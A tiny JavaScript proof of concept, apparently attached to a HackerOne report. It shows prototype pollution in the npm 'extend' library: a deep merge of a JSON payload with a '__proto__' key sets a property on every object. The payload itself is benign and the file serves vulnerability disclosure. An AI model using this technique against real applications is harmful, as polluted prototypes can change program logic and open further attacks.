//https://hackerone.com/reports/381185
 
  let extend = require("extend");
  let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  var obj = {};

   

  extend(true, {}, payload);
// End of file
